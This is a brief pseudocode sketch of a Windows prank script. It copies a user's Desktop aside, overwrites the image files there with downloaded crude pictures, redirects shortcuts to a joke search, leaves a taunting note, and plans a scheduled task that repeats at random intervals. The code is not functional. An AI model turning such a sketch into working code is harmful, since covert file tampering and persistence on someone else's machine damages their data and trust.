# Enumerate targets
# Copy Desktop to Goofin for safe keeping
Copy-Item -Path "$home\Desktop" -Destination "C:\Goofin\cuts" -Recurse 

$targets = (gci $home\Desktop\ -Recurse) 
for each $target in $targets

        Webrequest ImageSearch "juicy-ass-butt-%RANDOMNUMBER%"
        Save to goofin/butts directory as butt1.png, butt2.png, butt3.png 
        Cat butts dir and store in $butts 
    for eah target in targets
        Where extension = any image extension
            Copy each item with original filename to Goofin/cuts        
            Loop through and replace file with $butts content sequentially, starting over if more targets > butts
        Where extension = .lnk 
            Copy each item with original filename to Goofin/cuts
            leave icon the same, just redirect link to open a google search for random butt search

# Hit 'em with it
cd Desktop  notepad buttboss.txt writefile "Now who's boss."  



# Persistence mechanisms

# Schduled task for the script
# Could we set it to choose a number between 7-20 = x and create a that runs every x days?